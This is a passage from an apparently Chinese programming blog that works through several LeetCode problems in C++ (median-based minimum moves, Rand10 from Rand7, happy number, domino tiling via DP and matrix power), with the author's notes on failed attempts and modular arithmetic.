$$<br>并使用前缀和优化<br>找他的最小值即可</p></blockquote><h3 id="数学方法"><a href="#数学方法" class="headerlink" title="数学方法"></a>数学方法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += <span class="built_in">abs</span>(nums[i] - nums[len/<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>排序后，中位数之一刚好就是所求元素<br>假设 $ a_i a_j; i+j&#x3D;len-1 $ 为两个待调整元素<br>$ h $ 为最终调整后的数，那么 $$ h &#x3D; a_j - d_j  &#x3D; d_i - a_i $$<br>也就是 $$ a_j - a_i &#x3D; d_j + d_i $$<br>对于关于中心对称的数，不管要调整成他们中间的哪一个数，调整的步数之和总是 $ a_j - a_i $</p></blockquote><ul><li>所以根本不需要知道最终调整成哪个数，只要计算对称位置的两个数的差值之和即可</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++) &#123;</span><br><span class="line">            sum += nums[len<span class="number">-1</span>-i] - nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="不排序找到第len-x2F-2小的数"><a href="#不排序找到第len-x2F-2小的数" class="headerlink" title="不排序找到第len&#x2F;2小的数"></a>不排序找到第len&#x2F;2小的数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">nth_element</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">begin</span>() + len/<span class="number">2</span>, nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += <span class="built_in">abs</span>(nums[i] - nums[len/<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>自己实现partition</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = len;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">            k = <span class="built_in">partition</span>(nums, i ,j);</span><br><span class="line">            <span class="keyword">if</span>(k == len/<span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(k &gt; len/<span class="number">2</span>) &#123;</span><br><span class="line">                j = k;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = k+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += <span class="built_in">abs</span>(nums[i] - nums[k]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> target = i;</span><br><span class="line">        j--;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt; i &amp;&amp; nums[j] &gt;= nums[target]) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[j] &lt; nums[target])<span class="built_in">swap</span>(nums[target], nums[j]);</span><br><span class="line">            target = j;</span><br><span class="line">            <span class="keyword">while</span>(j &gt; i &amp;&amp; nums[i] &lt;= nums[target]) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; nums[target])<span class="built_in">swap</span>(nums[target], nums[i]);</span><br><span class="line">            target = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>太慢了。。。</p><ul><li>去掉swap</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = len<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">            k = <span class="built_in">partition</span>(nums, i, j);</span><br><span class="line">            <span class="keyword">if</span>(k == len/<span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(k &gt; len/<span class="number">2</span>) &#123;</span><br><span class="line">                j = k<span class="number">-1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = k+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += <span class="built_in">abs</span>(nums[i] - nums[k]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> pivot = nums[i];</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt; i &amp;&amp; nums[j] &gt;= pivot) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[i] = nums[j];</span><br><span class="line">            <span class="keyword">while</span>(j &gt; i &amp;&amp; nums[i] &lt;= pivot) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[j] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[i] = pivot;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="470-用-Rand7-实现-Rand10"><a href="#470-用-Rand7-实现-Rand10" class="headerlink" title="470. 用 Rand7() 实现 Rand10()"></a><a href="https://leetcode.cn/problems/implement-rand10-using-rand7/">470. 用 Rand7() 实现 Rand10()</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rand10</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rand</span>()%<span class="number">10</span>+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>满身反骨</p></blockquote><h2 id="202-快乐数"><a href="#202-快乐数" class="headerlink" title="202. 快乐数"></a><a href="https://leetcode.cn/problems/happy-number/">202. 快乐数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">1</span>) &#123;</span><br><span class="line">            n = <span class="built_in">next</span>(n);</span><br><span class="line">            <span class="keyword">if</span>(n == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">next</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n) &#123;</span><br><span class="line">            sum += (n%<span class="number">10</span>)*(n%<span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>大家都有相同的循环节</p></blockquote><h3 id="快慢指针"><a href="#快慢指针" class="headerlink" title="快慢指针"></a>快慢指针</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nn = n;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            n = <span class="built_in">next</span>(n);</span><br><span class="line">            nn = <span class="built_in">next</span>(nn);</span><br><span class="line">            <span class="keyword">if</span>(nn == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            nn = <span class="built_in">next</span>(nn);</span><br><span class="line">            <span class="keyword">if</span>(nn == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(n != nn);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">next</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n) &#123;</span><br><span class="line">            sum += (n%<span class="number">10</span>)*(n%<span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nn = n;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            n = <span class="built_in">next</span>(n);</span><br><span class="line">            <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            nn = <span class="built_in">next</span>(nn);</span><br><span class="line">            nn = <span class="built_in">next</span>(nn);</span><br><span class="line">        &#125; <span class="keyword">while</span>(n != nn);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">next</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n) &#123;</span><br><span class="line">            sum += (n%<span class="number">10</span>)*(n%<span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="790-多米诺和托米诺平铺"><a href="#790-多米诺和托米诺平铺" class="headerlink" title="790. 多米诺和托米诺平铺"></a>790. 多米诺和托米诺平铺</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">double</span>&gt; frac;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numTilings</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        frac = <span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;(n+<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            frac[i] = (i * frac[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">calcualte</span>(n, n, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">calcualte</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> n, <span class="type">int</span> count, <span class="type">double</span> div)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = n/k; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="type">double</span> div1 = (div*frac[i]);</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = (n-i*k)/k; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                    <span class="built_in">calcualte</span>(k<span class="number">-1</span>, n - i*k - j*k, count + i + j, (div1*frac[j]) );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(k == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = n/k; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="built_in">calcualte</span>(k<span class="number">-1</span>, n-i*k, count + i, (div*frac[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sum = <span class="built_in">int</span>(sum + frac[count + n]/div/frac[n])%<span class="number">1000000007</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>没通过，思路不对，算阶乘溢出，找出所有组合的代价也太大</p></blockquote><blockquote><p>在这个地方我犯了一个错误，就是认为 $ \frac{a}{b} \quad mod\quad c &#x3D; \frac{a\quad mod\quad c}{b\quad mod\quad c} $<br>正确的关系是， $ \frac{a}{b}\quad mod\quad c &#x3D; \frac{a\quad mod\quad (b \cdot c)}{b} $ ，证明：<br>$ \frac{a}{b}\quad mod\quad c &#x3D; k $<br>$ \frac{a}{b} &#x3D; x \cdot c + k $<br>$ a  &#x3D; b \cdot x \cdot c + b \cdot k $<br>$ a\quad mod\quad (b \cdot c) &#x3D; b \cdot k $<br>$ a\quad mod\quad (b \cdot c) &#x2F; b &#x3D; k $<br>$ \frac{a}{b}\quad mod\quad c &#x3D; \frac{a\quad mod\quad (b \cdot c)}{b} $</p></blockquote><blockquote><p>$ a^n \quad mod \quad c &#x3D; (a \cdot a^{n-1}) \quad mod \quad c &#x3D; ((a \quad mod \quad c) \cdot (a^{n-1} \quad mod \quad c)) \quad mod \quad c$</p></blockquote><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MOD 1000000007</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numTilings</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">4</span>, <span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">3</span>];</span><br><span class="line">            dp[i][<span class="number">1</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">2</span>])%MOD;</span><br><span class="line">            dp[i][<span class="number">2</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">1</span>])%MOD;</span><br><span class="line">            dp[i][<span class="number">3</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">1</span>] + dp[i<span class="number">-1</span>][<span class="number">2</span>] + dp[i<span class="number">-1</span>][<span class="number">3</span>])%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n][<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p><img src="https://assets.leetcode-cn.com/solution-static/790/1.png"></p></blockquote><h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MOD 1000000007</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numTilings</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; pow = &#123;</span><br><span class="line">            &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;</span><br><span class="line">        &#125;, base = &#123;</span><br><span class="line">            &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        pow = <span class="built_in">matPow</span>(pow, n, <span class="number">4</span>);</span><br><span class="line">        base = <span class="built_in">matMul</span>(pow, base, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> base[<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">matPow</span>(vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp; a, <span class="type">int</span> pow, <span class="type">int</span> m) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">res</span>(m, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(m));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            res[i][i] = <span 